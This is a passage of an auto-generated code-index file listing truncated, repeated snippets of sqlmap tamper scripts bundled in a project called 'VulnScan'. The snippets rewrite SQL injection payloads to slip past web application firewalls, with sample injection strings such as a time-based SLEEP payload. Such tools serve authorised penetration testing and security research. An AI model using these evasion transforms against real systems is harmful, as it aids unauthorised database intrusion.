        "peekOfCode": "def dependencies():\n    pass\ndef tamper(payload, **kwargs):\n    \"\"\"\n    URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -> %53%45%4C%45%43%54)\n    Tested against:\n        * Microsoft SQL Server 2005\n        * MySQL 4, 5.0 and 5.5\n        * Oracle 10g\n        * PostgreSQL 8.3, 8.4, 9.0",
        "detail": "VulnScan.modules.sqlmap.tamper.charencode",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.charencode",
        "description": "VulnScan.modules.sqlmap.tamper.charencode",
        "peekOfCode": "def tamper(payload, **kwargs):\n    \"\"\"\n    URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -> %53%45%4C%45%43%54)\n    Tested against:\n        * Microsoft SQL Server 2005\n        * MySQL 4, 5.0 and 5.5\n        * Oracle 10g\n        * PostgreSQL 8.3, 8.4, 9.0\n    Notes:\n        * Useful to bypass very weak web application firewalls that do not url-decode the request before processing it through their ruleset",
        "detail": "VulnScan.modules.sqlmap.tamper.charencode",
        "documentation": {}
    },
    {
        "label": "__priority__",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.tamper.charencode",
        "description": "VulnScan.modules.sqlmap.tamper.charencode",
        "peekOfCode": "__priority__ = PRIORITY.LOWEST\ndef dependencies():\n    pass\ndef tamper(payload, **kwargs):\n    \"\"\"\n    URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -> %53%45%4C%45%43%54)\n    Tested against:\n        * Microsoft SQL Server 2005\n        * MySQL 4, 5.0 and 5.5\n        * Oracle 10g",
        "detail": "VulnScan.modules.sqlmap.tamper.charencode",
        "documentation": {}
    },
    {
        "label": "dependencies",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.charunicodeencode",
        "description": "VulnScan.modules.sqlmap.tamper.charunicodeencode",
        "peekOfCode": "def dependencies():\n    singleTimeWarnMessage(\"tamper script '%s' is only meant to be run against ASP or ASP.NET web applications\" % os.path.basename(__file__).split(\".\")[0])\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Unicode-URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -> %u0053%u0045%u004C%u0045%u0043%u0054)\n    Requirement:\n        * ASP\n        * ASP.NET\n    Tested against:\n        * Microsoft SQL Server 2000",
        "detail": "VulnScan.modules.sqlmap.tamper.charunicodeencode",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.charunicodeencode",
        "description": "VulnScan.modules.sqlmap.tamper.charunicodeencode",
        "peekOfCode": "def tamper(payload, **kwargs):\n    \"\"\"\n    Unicode-URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -> %u0053%u0045%u004C%u0045%u0043%u0054)\n    Requirement:\n        * ASP\n        * ASP.NET\n    Tested against:\n        * Microsoft SQL Server 2000\n        * Microsoft SQL Server 2005\n        * MySQL 5.1.56",
        "detail": "VulnScan.modules.sqlmap.tamper.charunicodeencode",
        "documentation": {}
    },
    {
        "label": "__priority__",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.tamper.charunicodeencode",
        "description": "VulnScan.modules.sqlmap.tamper.charunicodeencode",
        "peekOfCode": "__priority__ = PRIORITY.LOWEST\ndef dependencies():\n    singleTimeWarnMessage(\"tamper script '%s' is only meant to be run against ASP or ASP.NET web applications\" % os.path.basename(__file__).split(\".\")[0])\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Unicode-URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -> %u0053%u0045%u004C%u0045%u0043%u0054)\n    Requirement:\n        * ASP\n        * ASP.NET\n    Tested against:",
        "detail": "VulnScan.modules.sqlmap.tamper.charunicodeencode",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.charunicodeescape",
        "description": "VulnScan.modules.sqlmap.tamper.charunicodeescape",
        "peekOfCode": "def tamper(payload, **kwargs):\n    \"\"\"\n    Unicode-escapes non-encoded characters in a given payload (not processing already encoded) (e.g. SELECT -> \\u0053\\u0045\\u004C\\u0045\\u0043\\u0054)\n    Notes:\n        * Useful to bypass weak filtering and/or WAFs in JSON contexes\n    >>> tamper('SELECT FIELD FROM TABLE')\n    '\\\\\\\\u0053\\\\\\\\u0045\\\\\\\\u004C\\\\\\\\u0045\\\\\\\\u0043\\\\\\\\u0054\\\\\\\\u0020\\\\\\\\u0046\\\\\\\\u0049\\\\\\\\u0045\\\\\\\\u004C\\\\\\\\u0044\\\\\\\\u0020\\\\\\\\u0046\\\\\\\\u0052\\\\\\\\u004F\\\\\\\\u004D\\\\\\\\u0020\\\\\\\\u0054\\\\\\\\u0041\\\\\\\\u0042\\\\\\\\u004C\\\\\\\\u0045'\n    \"\"\"\n    retVal = payload\n    if payload:",
        "detail": "VulnScan.modules.sqlmap.tamper.charunicodeescape",
        "documentation": {}
    },
    {
        "label": "__priority__",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.tamper.charunicodeescape",
        "description": "VulnScan.modules.sqlmap.tamper.charunicodeescape",
        "peekOfCode": "__priority__ = PRIORITY.NORMAL\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Unicode-escapes non-encoded characters in a given payload (not processing already encoded) (e.g. SELECT -> \\u0053\\u0045\\u004C\\u0045\\u0043\\u0054)\n    Notes:\n        * Useful to bypass weak filtering and/or WAFs in JSON contexes\n    >>> tamper('SELECT FIELD FROM TABLE')\n    '\\\\\\\\u0053\\\\\\\\u0045\\\\\\\\u004C\\\\\\\\u0045\\\\\\\\u0043\\\\\\\\u0054\\\\\\\\u0020\\\\\\\\u0046\\\\\\\\u0049\\\\\\\\u0045\\\\\\\\u004C\\\\\\\\u0044\\\\\\\\u0020\\\\\\\\u0046\\\\\\\\u0052\\\\\\\\u004F\\\\\\\\u004D\\\\\\\\u0020\\\\\\\\u0054\\\\\\\\u0041\\\\\\\\u0042\\\\\\\\u004C\\\\\\\\u0045'\n    \"\"\"\n    retVal = payload",
        "detail": "VulnScan.modules.sqlmap.tamper.charunicodeescape",
        "documentation": {}
    },
    {
        "label": "dependencies",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.commalesslimit",
        "description": "VulnScan.modules.sqlmap.tamper.commalesslimit",
        "peekOfCode": "def dependencies():\n    singleTimeWarnMessage(\"tamper script '%s' is only meant to be run against %s\" % (os.path.basename(__file__).split(\".\")[0], DBMS.MYSQL))\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces (MySQL) instances like 'LIMIT M, N' with 'LIMIT N OFFSET M' counterpart\n    Requirement:\n        * MySQL\n    Tested against:\n        * MySQL 5.0 and 5.5\n    >>> tamper('LIMIT 2, 3')",
        "detail": "VulnScan.modules.sqlmap.tamper.commalesslimit",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.commalesslimit",
        "description": "VulnScan.modules.sqlmap.tamper.commalesslimit",
        "peekOfCode": "def tamper(payload, **kwargs):\n    \"\"\"\n    Replaces (MySQL) instances like 'LIMIT M, N' with 'LIMIT N OFFSET M' counterpart\n    Requirement:\n        * MySQL\n    Tested against:\n        * MySQL 5.0 and 5.5\n    >>> tamper('LIMIT 2, 3')\n    'LIMIT 3 OFFSET 2'\n    \"\"\"",
        "detail": "VulnScan.modules.sqlmap.tamper.commalesslimit",
        "documentation": {}
    },
    {
        "label": "__priority__",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.tamper.commalesslimit",
        "description": "VulnScan.modules.sqlmap.tamper.commalesslimit",
        "peekOfCode": "__priority__ = PRIORITY.HIGH\ndef dependencies():\n    singleTimeWarnMessage(\"tamper script '%s' is only meant to be run against %s\" % (os.path.basename(__file__).split(\".\")[0], DBMS.MYSQL))\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces (MySQL) instances like 'LIMIT M, N' with 'LIMIT N OFFSET M' counterpart\n    Requirement:\n        * MySQL\n    Tested against:\n        * MySQL 5.0 and 5.5",
        "detail": "VulnScan.modules.sqlmap.tamper.commalesslimit",
        "documentation": {}
    },
    {
        "label": "dependencies",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.commalessmid",
        "description": "VulnScan.modules.sqlmap.tamper.commalessmid",
        "peekOfCode": "def dependencies():\n    singleTimeWarnMessage(\"tamper script '%s' is only meant to be run against %s\" % (os.path.basename(__file__).split(\".\")[0], DBMS.MYSQL))\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces (MySQL) instances like 'MID(A, B, C)' with 'MID(A FROM B FOR C)' counterpart\n    Requirement:\n        * MySQL\n    Tested against:\n        * MySQL 5.0 and 5.5\n    >>> tamper('MID(VERSION(), 1, 1)')",
        "detail": "VulnScan.modules.sqlmap.tamper.commalessmid",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.commalessmid",
        "description": "VulnScan.modules.sqlmap.tamper.commalessmid",
        "peekOfCode": "def tamper(payload, **kwargs):\n    \"\"\"\n    Replaces (MySQL) instances like 'MID(A, B, C)' with 'MID(A FROM B FOR C)' counterpart\n    Requirement:\n        * MySQL\n    Tested against:\n        * MySQL 5.0 and 5.5\n    >>> tamper('MID(VERSION(), 1, 1)')\n    'MID(VERSION() FROM 1 FOR 1)'\n    \"\"\"",
        "detail": "VulnScan.modules.sqlmap.tamper.commalessmid",
        "documentation": {}
    },
    {
        "label": "__priority__",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.tamper.commalessmid",
        "description": "VulnScan.modules.sqlmap.tamper.commalessmid",
        "peekOfCode": "__priority__ = PRIORITY.HIGH\ndef dependencies():\n    singleTimeWarnMessage(\"tamper script '%s' is only meant to be run against %s\" % (os.path.basename(__file__).split(\".\")[0], DBMS.MYSQL))\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces (MySQL) instances like 'MID(A, B, C)' with 'MID(A FROM B FOR C)' counterpart\n    Requirement:\n        * MySQL\n    Tested against:\n        * MySQL 5.0 and 5.5",
        "detail": "VulnScan.modules.sqlmap.tamper.commalessmid",
        "documentation": {}
    },
    {
        "label": "dependencies",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.commentbeforeparentheses",
        "description": "VulnScan.modules.sqlmap.tamper.commentbeforeparentheses",
        "peekOfCode": "def dependencies():\n    pass\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Prepends (inline) comment before parentheses (e.g. ( -> /**/()\n    Tested against:\n        * Microsoft SQL Server\n        * MySQL\n        * Oracle\n        * PostgreSQL",
        "detail": "VulnScan.modules.sqlmap.tamper.commentbeforeparentheses",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.commentbeforeparentheses",
        "description": "VulnScan.modules.sqlmap.tamper.commentbeforeparentheses",
        "peekOfCode": "def tamper(payload, **kwargs):\n    \"\"\"\n    Prepends (inline) comment before parentheses (e.g. ( -> /**/()\n    Tested against:\n        * Microsoft SQL Server\n        * MySQL\n        * Oracle\n        * PostgreSQL\n    Notes:\n        * Useful to bypass web application firewalls that block usage",
        "detail": "VulnScan.modules.sqlmap.tamper.commentbeforeparentheses",
        "documentation": {}
    },
    {
        "label": "__priority__",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.tamper.commentbeforeparentheses",
        "description": "VulnScan.modules.sqlmap.tamper.commentbeforeparentheses",
        "peekOfCode": "__priority__ = PRIORITY.NORMAL\ndef dependencies():\n    pass\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Prepends (inline) comment before parentheses (e.g. ( -> /**/()\n    Tested against:\n        * Microsoft SQL Server\n        * MySQL\n        * Oracle",
        "detail": "VulnScan.modules.sqlmap.tamper.commentbeforeparentheses",
        "documentation": {}
    },
    {
        "label": "dependencies",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.concat2concatws",
        "description": "VulnScan.modules.sqlmap.tamper.concat2concatws",
        "peekOfCode": "def dependencies():\n    singleTimeWarnMessage(\"tamper script '%s' is only meant to be run against %s\" % (os.path.basename(__file__).split(\".\")[0], DBMS.MYSQL))\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces (MySQL) instances like 'CONCAT(A, B)' with 'CONCAT_WS(MID(CHAR(0), 0, 0), A, B)' counterpart\n    Requirement:\n        * MySQL\n    Tested against:\n        * MySQL 5.0\n    Notes:",
        "detail": "VulnScan.modules.sqlmap.tamper.concat2concatws",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.concat2concatws",
        "description": "VulnScan.modules.sqlmap.tamper.concat2concatws",
        "peekOfCode": "def tamper(payload, **kwargs):\n    \"\"\"\n    Replaces (MySQL) instances like 'CONCAT(A, B)' with 'CONCAT_WS(MID(CHAR(0), 0, 0), A, B)' counterpart\n    Requirement:\n        * MySQL\n    Tested against:\n        * MySQL 5.0\n    Notes:\n        * Useful to bypass very weak and bespoke web application firewalls\n          that filter the CONCAT() function",
        "detail": "VulnScan.modules.sqlmap.tamper.concat2concatws",
        "documentation": {}
    },
    {
        "label": "__priority__",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.tamper.concat2concatws",
        "description": "VulnScan.modules.sqlmap.tamper.concat2concatws",
        "peekOfCode": "__priority__ = PRIORITY.HIGHEST\ndef dependencies():\n    singleTimeWarnMessage(\"tamper script '%s' is only meant to be run against %s\" % (os.path.basename(__file__).split(\".\")[0], DBMS.MYSQL))\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces (MySQL) instances like 'CONCAT(A, B)' with 'CONCAT_WS(MID(CHAR(0), 0, 0), A, B)' counterpart\n    Requirement:\n        * MySQL\n    Tested against:\n        * MySQL 5.0",
        "detail": "VulnScan.modules.sqlmap.tamper.concat2concatws",
        "documentation": {}
    },
    {
        "label": "dependencies",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.decentities",
        "description": "VulnScan.modules.sqlmap.tamper.decentities",
        "peekOfCode": "def dependencies():\n    pass\ndef tamper(payload, **kwargs):\n    \"\"\"\n    HTML encode in decimal (using code points) all characters (e.g. ' -> &#39;)\n    >>> tamper(\"1' AND SLEEP(5)#\")\n    '&#49;&#39;&#32;&#65;&#78;&#68;&#32;&#83;&#76;&#69;&#69;&#80;&#40;&#53;&#41;&#35;'\n    \"\"\"\n    retVal = payload\n    if payload:",
        "detail": "VulnScan.modules.sqlmap.tamper.decentities",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.decentities",
        "description": "VulnScan.modules.sqlmap.tamper.decentities",
        "peekOfCode": "def tamper(payload, **kwargs):\n    \"\"\"\n    HTML encode in decimal (using code points) all characters (e.g. ' -> &#39;)\n    >>> tamper(\"1' AND SLEEP(5)#\")\n    '&#49;&#39;&#32;&#65;&#78;&#68;&#32;&#83;&#76;&#69;&#69;&#80;&#40;&#53;&#41;&#35;'\n    \"\"\"\n    retVal = payload\n    if payload:\n        retVal = \"\"\n        i = 0",
        "detail": "VulnScan.modules.sqlmap.tamper.decentities",
        "documentation": {}
    },
    {
        "label": "__priority__",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.tamper.decentities",
        "description": "VulnScan.modules.sqlmap.tamper.decentities",
        "peekOfCode": "__priority__ = PRIORITY.LOW\ndef dependencies():\n    pass\ndef tamper(payload, **kwargs):\n    \"\"\"\n    HTML encode in decimal (using code points) all characters (e.g. ' -> &#39;)\n    >>> tamper(\"1' AND SLEEP(5)#\")\n    '&#49;&#39;&#32;&#65;&#78;&#68;&#32;&#83;&#76;&#69;&#69;&#80;&#40;&#53;&#41;&#35;'\n    \"\"\"\n    retVal = payload",
        "detail": "VulnScan.modules.sqlmap.tamper.decentities",
        "documentation": {}
    },
    {
        "label": "dependencies",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.dunion",
        "description": "VulnScan.modules.sqlmap.tamper.dunion",
        "peekOfCode": "def dependencies():\n    singleTimeWarnMessage(\"tamper script '%s' is only meant to be run against %s\" % (os.path.basename(__file__).split(\".\")[0], DBMS.ORACLE))\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces instances of <int> UNION with <int>DUNION\n    Requirement:\n        * Oracle\n    Notes:\n        * Reference: https://media.blackhat.com/us-13/US-13-Salgado-SQLi-Optimization-and-Obfuscation-Techniques-Slides.pdf\n    >>> tamper('1 UNION ALL SELECT')",
        "detail": "VulnScan.modules.sqlmap.tamper.dunion",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.dunion",
        "description": "VulnScan.modules.sqlmap.tamper.dunion",
        "peekOfCode": "def tamper(payload, **kwargs):\n    \"\"\"\n    Replaces instances of <int> UNION with <int>DUNION\n    Requirement:\n        * Oracle\n    Notes:\n        * Reference: https://media.blackhat.com/us-13/US-13-Salgado-SQLi-Optimization-and-Obfuscation-Techniques-Slides.pdf\n    >>> tamper('1 UNION ALL SELECT')\n    '1DUNION ALL SELECT'\n    \"\"\"",
        "detail": "VulnScan.modules.sqlmap.tamper.dunion",
        "documentation": {}
    },
    {
        "label": "__priority__",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.tamper.dunion",
        "description": "VulnScan.modules.sqlmap.tamper.dunion",
        "peekOfCode": "__priority__ = PRIORITY.HIGHEST\ndef dependencies():\n    singleTimeWarnMessage(\"tamper script '%s' is only meant to be run against %s\" % (os.path.basename(__file__).split(\".\")[0], DBMS.ORACLE))\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces instances of <int> UNION with <int>DUNION\n    Requirement:\n        * Oracle\n    Notes:\n        * Reference: https://media.blackhat.com/us-13/US-13-Salgado-SQLi-Optimization-and-Obfuscation-Techniques-Slides.pdf",
        "detail": "VulnScan.modules.sqlmap.tamper.dunion",
        "documentation": {}
    },
    {
        "label": "dependencies",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.equaltolike",
        "description": "VulnScan.modules.sqlmap.tamper.equaltolike",
        "peekOfCode": "def dependencies():\n    pass\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces all occurrences of operator equal ('=') with 'LIKE' counterpart\n    Tested against:\n        * Microsoft SQL Server 2005\n        * MySQL 4, 5.0 and 5.5\n    Notes:\n        * Useful to bypass weak and bespoke web application firewalls that",
        "detail": "VulnScan.modules.sqlmap.tamper.equaltolike",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.equaltolike",
        "description": "VulnScan.modules.sqlmap.tamper.equaltolike",
        "peekOfCode": "def tamper(payload, **kwargs):\n    \"\"\"\n    Replaces all occurrences of operator equal ('=') with 'LIKE' counterpart\n    Tested against:\n        * Microsoft SQL Server 2005\n        * MySQL 4, 5.0 and 5.5\n    Notes:\n        * Useful to bypass weak and bespoke web application firewalls that\n          filter the equal character ('=')\n        * The LIKE operator is SQL standard. Hence, this tamper script",
        "detail": "VulnScan.modules.sqlmap.tamper.equaltolike",
        "documentation": {}
    },
    {
        "label": "__priority__",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.tamper.equaltolike",
        "description": "VulnScan.modules.sqlmap.tamper.equaltolike",
        "peekOfCode": "__priority__ = PRIORITY.HIGHEST\ndef dependencies():\n    pass\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces all occurrences of operator equal ('=') with 'LIKE' counterpart\n    Tested against:\n        * Microsoft SQL Server 2005\n        * MySQL 4, 5.0 and 5.5\n    Notes:",
        "detail": "VulnScan.modules.sqlmap.tamper.equaltolike",
        "documentation": {}
    },
    {
        "label": "dependencies",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.equaltorlike",
        "description": "VulnScan.modules.sqlmap.tamper.equaltorlike",
        "peekOfCode": "def dependencies():\n    pass\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces all occurrences of operator equal ('=') with 'RLIKE' counterpart\n    Tested against:\n        * MySQL 4, 5.0 and 5.5\n    Notes:\n        * Useful to bypass weak and bespoke web application firewalls that\n          filter the equal character ('=')",
        "detail": "VulnScan.modules.sqlmap.tamper.equaltorlike",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.equaltorlike",
        "description": "VulnScan.modules.sqlmap.tamper.equaltorlike",
        "peekOfCode": "def tamper(payload, **kwargs):\n    \"\"\"\n    Replaces all occurrences of operator equal ('=') with 'RLIKE' counterpart\n    Tested against:\n        * MySQL 4, 5.0 and 5.5\n    Notes:\n        * Useful to bypass weak and bespoke web application firewalls that\n          filter the equal character ('=')\n    >>> tamper('SELECT * FROM users WHERE id=1')\n    'SELECT * FROM users WHERE id RLIKE 1'",
        "detail": "VulnScan.modules.sqlmap.tamper.equaltorlike",
        "documentation": {}
    },
    {
        "label": "__priority__",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.tamper.equaltorlike",
        "description": "VulnScan.modules.sqlmap.tamper.equaltorlike",
        "peekOfCode": "__priority__ = PRIORITY.HIGHEST\ndef dependencies():\n    pass\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces all occurrences of operator equal ('=') with 'RLIKE' counterpart\n    Tested against:\n        * MySQL 4, 5.0 and 5.5\n    Notes:\n        * Useful to bypass weak and bespoke web application firewalls that",
        "detail": "VulnScan.modules.sqlmap.tamper.equaltorlike",
        "documentation": {}
    },
    {
        "label": "dependencies",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.escapequotes",
        "description": "VulnScan.modules.sqlmap.tamper.escapequotes",
        "peekOfCode": "def dependencies():\n    pass\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Slash escape single and double quotes (e.g. ' -> \\')\n    >>> tamper('1\" AND SLEEP(5)#')\n    '1\\\\\\\\\" AND SLEEP(5)#'\n    \"\"\"\n    return payload.replace(\"'\", \"\\\\'\").replace('\"', '\\\\\"')",
        "detail": "VulnScan.modules.sqlmap.tamper.escapequotes",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.escapequotes",
        "description": "VulnScan.modules.sqlmap.tamper.escapequotes",
        "peekOfCode": "def tamper(payload, **kwargs):\n    \"\"\"\n    Slash escape single and double quotes (e.g. ' -> \\')\n    >>> tamper('1\" AND SLEEP(5)#')\n    '1\\\\\\\\\" AND SLEEP(5)#'\n    \"\"\"\n    return payload.replace(\"'\", \"\\\\'\").replace('\"', '\\\\\"')",
        "detail": "VulnScan.modules.sqlmap.tamper.escapequotes",
        "documentation": {}
    },
    {
        "label": "__priority__",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.tamper.escapequotes",
        "description": "VulnScan.modules.sqlmap.tamper.escapequotes",
        "peekOfCode": "__priority__ = PRIORITY.NORMAL\ndef dependencies():\n    pass\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Slash escape single and double quotes (e.g. ' -> \\')\n    >>> tamper('1\" AND SLEEP(5)#')\n    '1\\\\\\\\\" AND SLEEP(5)#'\n    \"\"\"\n    return payload.replace(\"'\", \"\\\\'\").replace('\"', '\\\\\"')",
        "detail": "VulnScan.modules.sqlmap.tamper.escapequotes",
        "documentation": {}
    },
    {
        "label": "dependencies",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.greatest",
        "description": "VulnScan.modules.sqlmap.tamper.greatest",
        "peekOfCode": "def dependencies():\n    pass\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces greater than operator ('>') with 'GREATEST' counterpart\n    Tested against:\n        * MySQL 4, 5.0 and 5.5\n        * Oracle 10g\n        * PostgreSQL 8.3, 8.4, 9.0\n    Notes:",
        "detail": "VulnScan.modules.sqlmap.tamper.greatest",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.greatest",
        "description": "VulnScan.modules.sqlmap.tamper.greatest",
        "peekOfCode": "def tamper(payload, **kwargs):\n    \"\"\"\n    Replaces greater than operator ('>') with 'GREATEST' counterpart\n    Tested against:\n        * MySQL 4, 5.0 and 5.5\n        * Oracle 10g\n        * PostgreSQL 8.3, 8.4, 9.0\n    Notes:\n        * Useful to bypass weak and bespoke web application firewalls that\n          filter the greater than character",
        "detail": "VulnScan.modules.sqlmap.tamper.greatest",
        "documentation": {}
    },
    {
        "label": "__priority__",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.tamper.greatest",
        "description": "VulnScan.modules.sqlmap.tamper.greatest",
        "peekOfCode": "__priority__ = PRIORITY.HIGHEST\ndef dependencies():\n    pass\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces greater than operator ('>') with 'GREATEST' counterpart\n    Tested against:\n        * MySQL 4, 5.0 and 5.5\n        * Oracle 10g\n        * PostgreSQL 8.3, 8.4, 9.0",
        "detail": "VulnScan.modules.sqlmap.tamper.greatest",
        "documentation": {}
    },
    {
        "label": "dependencies",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.halfversionedmorekeywords",
        "description": "VulnScan.modules.sqlmap.tamper.halfversionedmorekeywords",
        "peekOfCode": "def dependencies():\n    singleTimeWarnMessage(\"tamper script '%s' is only meant to be run against %s < 5.1\" % (os.path.basename(__file__).split(\".\")[0], DBMS.MYSQL))\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Adds (MySQL) versioned comment before each keyword\n    Requirement:\n        * MySQL < 5.1\n    Tested against:\n        * MySQL 4.0.18, 5.0.22\n    Notes:",
        "detail": "VulnScan.modules.sqlmap.tamper.halfversionedmorekeywords",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.halfversionedmorekeywords",
        "description": "VulnScan.modules.sqlmap.tamper.halfversionedmorekeywords",
        "peekOfCode": "def tamper(payload, **kwargs):\n    \"\"\"\n    Adds (MySQL) versioned comment before each keyword\n    Requirement:\n        * MySQL < 5.1\n    Tested against:\n        * MySQL 4.0.18, 5.0.22\n    Notes:\n        * Useful to bypass several web application firewalls when the\n          back-end database management system is MySQL",
        "detail": "VulnScan.modules.sqlmap.tamper.halfversionedmorekeywords",
        "documentation": {}
    },
    {
        "label": "__priority__",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.tamper.halfversionedmorekeywords",
        "description": "VulnScan.modules.sqlmap.tamper.halfversionedmorekeywords",
        "peekOfCode": "__priority__ = PRIORITY.HIGHER\ndef dependencies():\n    singleTimeWarnMessage(\"tamper script '%s' is only meant to be run against %s < 5.1\" % (os.path.basename(__file__).split(\".\")[0], DBMS.MYSQL))\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Adds (MySQL) versioned comment before each keyword\n    Requirement:\n        * MySQL < 5.1\n    Tested against:\n        * MySQL 4.0.18, 5.0.22",
        "detail": "VulnScan.modules.sqlmap.tamper.halfversionedmorekeywords",
        "documentation": {}
    },
    {
        "label": "dependencies",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.hex2char",
        "description": "VulnScan.modules.sqlmap.tamper.hex2char",
        "peekOfCode": "def dependencies():\n    singleTimeWarnMessage(\"tamper script '%s' is only meant to be run against %s\" % (os.path.basename(__file__).split(\".\")[0], DBMS.MYSQL))\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces each (MySQL) 0x<hex> encoded string with equivalent CONCAT(CHAR(),...) counterpart\n    Requirement:\n        * MySQL\n    Tested against:\n        * MySQL 4, 5.0 and 5.5\n    Notes:",
        "detail": "VulnScan.modules.sqlmap.tamper.hex2char",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.hex2char",
        "description": "VulnScan.modules.sqlmap.tamper.hex2char",
        "peekOfCode": "def tamper(payload, **kwargs):\n    \"\"\"\n    Replaces each (MySQL) 0x<hex> encoded string with equivalent CONCAT(CHAR(),...) counterpart\n    Requirement:\n        * MySQL\n    Tested against:\n        * MySQL 4, 5.0 and 5.5\n    Notes:\n        * Useful in cases when web application does the upper casing\n    >>> tamper('SELECT 0xdeadbeef')",
        "detail": "VulnScan.modules.sqlmap.tamper.hex2char",
        "documentation": {}
    },
    {
        "label": "__priority__",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.tamper.hex2char",
        "description": "VulnScan.modules.sqlmap.tamper.hex2char",
        "peekOfCode": "__priority__ = PRIORITY.NORMAL\ndef dependencies():\n    singleTimeWarnMessage(\"tamper script '%s' is only meant to be run against %s\" % (os.path.basename(__file__).split(\".\")[0], DBMS.MYSQL))\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces each (MySQL) 0x<hex> encoded string with equivalent CONCAT(CHAR(),...) counterpart\n    Requirement:\n        * MySQL\n    Tested against:\n        * MySQL 4, 5.0 and 5.5",
        "detail": "VulnScan.modules.sqlmap.tamper.hex2char",
        "documentation": {}
    },
    {
        "label": "dependencies",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.hexentities",
        "description": "VulnScan.modules.sqlmap.tamper.hexentities",
